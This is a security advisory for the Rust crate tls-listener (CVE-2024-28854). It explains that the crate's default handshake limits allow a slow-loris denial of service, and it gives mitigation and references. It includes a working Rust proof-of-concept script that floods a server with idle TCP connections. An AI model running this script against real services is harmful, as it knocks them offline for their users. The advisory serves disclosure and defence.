# [H] tls-listener affected by the slow loris vulnerability with default configuration

## Summary
Severity: High
Advisory: GHSA-2qph-qpvm-2qf7
CVE: CVE-2024-28854
CWE: CWE-400
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-03-15
Source: https://github.com/advisories/GHSA-2qph-qpvm-2qf7
Type: github-advisory

## Affected
- crates.io: `tls-listener` — affected >=0 <0.10.0

## Details
### Summary
With the default configuration of tls-listener, a malicious user can open 6.4 `TcpStream`s a second, sending 0 bytes, and can trigger a DoS.

### Details
The default configuration options make any public service using `TlsListener::new()` vulnerable to a slow-loris DoS attack.

```rust
/// Default number of concurrent handshakes
pub const DEFAULT_MAX_HANDSHAKES: usize = 64;
/// Default timeout for the TLS handshake.
pub const DEFAULT_HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(10);
```

### PoC

Running the HTTP TLS server example: https://github.com/tmccombs/tls-listener/blob/6c57dea2d9beb1577ae4d80f6eaf03aad4ef3857/examples/http.rs, then running the following script will prevent new connections to the server.

```rust
use std::{net::ToSocketAddrs, time::Duration};
use tokio::{io::AsyncReadExt, net::TcpStream, task::JoinSet};

#[tokio::main]
async fn main() {
    const N: usize = 1024;
    const T: Duration = Duration::from_secs(10);

    let url = "127.0.0.1:3000";
    let sockets: Vec<_> = url
        .to_socket_addrs()
        .unwrap()
        .inspect(|s| println!("{s:?}"))
        .collect();

    let mut js = JoinSet::new();

    let mut int = tokio::time::interval(T / (N as u32) / (sockets.len() as u32));
    int.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Burst);
    for _ in 0..10000 {
        for &socket in &sockets {
            int.tick().await;
            js.spawn(async move {
                let mut stream = TcpStream::connect(socket).await.unwrap();
                let _ = tokio::time::timeout(T, stream.read_to_end(&mut Vec::new())).await;
            });
        }
    }

    while js.join_next().await.is_some() {}
}

```

### Impact

This is an instance of a [slow-loris attack](https://en.wikipedia.org/wiki/Slowloris_(computer_security)). This impacts any publically accessible service using the default configuration of `tls-listener`


### Mitigation

Previous versions can mitigate this by passing a large value, such as `usize::MAX` as the parameter to `Builder::max_handshakes`.

## References
- https://github.com/tmccombs/tls-listener/security/advisories/GHSA-2qph-qpvm-2qf7
- https://nvd.nist.gov/vuln/detail/CVE-2024-28854
- https://github.com/tmccombs/tls-listener/commit/d5a7655d6ea9e53ab57c3013092c5576da964bc4
- https://en.wikipedia.org/wiki/Slowloris_(computer_security)
- https://github.com/tmccombs/tls-listener
- https://github.com/tmccombs/tls-listener/releases/tag/v0.10.0
- https://rustsec.org/advisories/RUSTSEC-2024-0341.html
